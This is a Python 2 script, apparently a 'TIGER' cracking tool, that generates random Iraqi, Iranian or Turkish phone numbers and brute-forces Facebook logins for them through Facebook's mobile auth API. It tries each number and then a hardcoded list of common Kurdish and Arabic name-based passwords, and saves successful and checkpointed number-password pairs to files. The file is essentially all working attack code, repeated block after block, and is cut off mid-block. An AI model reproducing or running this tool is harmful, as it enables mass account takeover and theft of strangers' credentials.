import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass 
 os.system('rm -rf .txt') 
 for n in range(1000): 
     nmbr = random.randint(1111111, 9999999) 
     sys.stdout = open('.txt', 'a') 
     print nmbr 
     sys.stdout.flush() 
  
 try: 
     import requests 
 except ImportError: 
     os.system('pip2 install requests') 
  
 try: 
     import mechanize 
 except ImportError: 
     os.system('pip2 install mechanize') 
     time.sleep(1) 
     os.system('python2 nmbr.py') 
  
 from multiprocessing.pool import ThreadPool 
 from requests.exceptions import ConnectionError 
 from mechanize import Browser 
 reload(sys) 
 sys.setdefaultencoding('utf8') 
 br = mechanize.Browser() 
 br.set_handle_robots(False) 
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1) 
 br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')] 
  
 def exb(): 
     print '[!] Exit' 
     os.sys.exit() 
  
  
 def psb(z): 
     for e in z + '\n': 
         sys.stdout.write(e) 
         sys.stdout.flush() 
         time.sleep(0.03) 
   
  
 def t(): 
     time.sleep(1) 
  
 def cb(): 
     os.system('clear') 
 os.system("filget TIGER") 
  
 logo ="""\x1b[93m\n__________________ _______  _______  _______ \n\\__   __/\\__   __/(  ____ \\(  ____ \\(  ____ )\n   ) (      ) (   | (    \\/| (    \\/| (    )|\n   | |      | |   | |      | (__    | (____)|\n   | |      | |   | | ____ |  __)   |     __)\n   | |      | |   | | \\_  )| (      | (\\ (   \n   | |   ___) (___| (___) || (____/\\| ) \\ \\__\n   )_(   \\_______/(_______)(_______/|/   \\__/                 \n--------------------------------------------------\n [ Author ]     : @Terminator_Dev\n\n [ GitHub ]      : https://github.com/x-tiger-x\n\n [ Telegram ]    : @BadChenal\n--------------------------------------------------""" 
  
 os.system("filget error") 
  
  
 back = 0 
 successful = [] 
 cpb = [] 
 oks = [] 
 id = [] 
  
 def menu(): 
     os.system('clear') 
     print logo  
     print '\x1b[1;94m[1]\x1b[1;93m CRACK RANDOM NUMBER IRAQ' 
     action() 
  
  
 def action(): 
     global cpb 
     global oks 
     bch = raw_input('\n\x1b[1;91mHALBZHIRA  \x1b[1;93m=\x1b[1;95m  ') 
     if bch == '': 
         print '[!] Fill in correctly' 
         action() 
     elif bch == '1': 
         os.system('clear') 
         print logo 
         print '\x1b[1;91m 750  751 770 780' 
         try: 
             c = raw_input('\x1b[1;93mcodek halbzhera  : ') 
             k = '+964' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             menu() 
  
     elif bch == '2': 
         os.system('clear') 
         print logo 
         print '901, 902, 903, 930, 933, 935, 936, 937, 938, 939' 
         try: 
             c = raw_input(' choose code  : ') 
             k = '+98' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             menu() 
  
     elif bch == '3': 
         os.system('clear') 
         print logo 
         print '\x1b[1;96m322, 264, 416, 272, 472, 382, 312' 
         try: 
             c = raw_input(' choose code  : ') 
             k = '+90' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             menu() 
  
     elif bch == '0': 
         exb() 
     else: 
         print '[!] Fill in correctly' 
         action() 
     xxx = str(len(id)) 
     print('\x1b[1;93mHAMW ZHMARAKAN: ' + xxx) 
     time.sleep(0.1) 
     print('\x1b[1;93mTOOL BY @Terminator_Dev') 
     print('\x1b[1;93mBO WASTANDE TOOL CTRL z') 
     print 49 * '\x1b[1;93m-' 
  
     def main(arg): 
         user = arg 
         try: 
             os.mkdir('save') 
         except OSError: 
             pass 
  
         try: 
             pass1 = user 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass1 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass1 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass1) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass1 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass1 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass1) 
             else: 
                 pass2 = 'abdulla1234' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass2 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass2 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass2) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass2 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass2 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass2) 
             else: 
                 pass3 = 'abdulla123' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass3 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass3 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass3) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass3 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass3 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass3) 
             else: 
                 pass4 = 'abdulla12' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass4 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass4 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass4) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass4 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass4 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass4) 
             else: 
                 pass5 = 'hama1122' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass5 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass5 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass5) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass5 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass5 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass5) 
             else: 
                 pass6 = 'hama1212' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass6 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass6 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass6) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass6 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass6 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass6) 
             else: 
                 pass7 = 'hama123' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass7 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass7 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass7) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass7 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass7 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass7) 
             else: 
                 pass8 = 'ahmad12' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass8 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass8 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass8) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass8 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass8 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass8) 
             else: 
                 pass9 = 'mhamad123' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass9 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass9 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass9) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass9 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass9 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass9) 
             else: 
                 pass10 = 'hama2000' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass10 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass10 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass10) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass10 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass10 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass10) 
             else: 
                 pass11 = 'hama2001' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass11 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass11 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass11) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass11 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass11 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass11) 
             else: 
                 pass12 = 'hama2002' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass12 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass12 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass12) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass12 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass12 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass12) 
             else: 
                 pass13 = 'hama2003' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass13 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass13 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass13) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass13 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass13 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass13) 
             else: 
                 pass14 = 'hama2004' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass14 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass14 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass14) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass14 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass14 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass14) 
             else: 
                 pass15 = 'hama2005' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass15 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass15 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass15) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass15 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass15 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass15) 
             else: 
                 pass16 = 'hama123456' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass16 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass16 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass16) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass16 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass16 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass16) 
             else: 
                 pass17 = 'hama1122334455' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass17 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass17 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass17 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass17) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass17 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass17 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass17) 
             else: 
                 pass18 = 'hama112233' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass18 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass18 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass18 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass18) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass18 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass18 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass18) 
             else: 
                 pass19 = 'ahmad1234' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass19 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass19 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass19 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass19) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass19 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass19 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass19) 
             else: 
                 pass20 = 'ali12' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass20 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass20 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass20 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass20) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass20 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass20 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass20) 
             else: 
                 pass21 = 'ahmad12345' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass21 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass21 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass21 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass21) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass21 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass21 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass21) 
             else: 
                 pass22 = 'ahmad123456' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass22 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass22 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass22 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass22) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass22 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass22 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass22) 
             else: 
                 pass23 = 'ahmad2000' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass23 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass23 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass23 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass23) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass23 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass23 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass23) 
             else: 
                 pass24 = 'ali1999' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass24 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass24 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass24 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass24) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass24 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass24 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass24)          
             else: 
                 pass25 = 'ahmad2001' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass25 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass25 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass25 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass25) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass25 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass25 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass25)    
             else: 
                 pass26 = 'ahmad2002' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass26 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass26 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
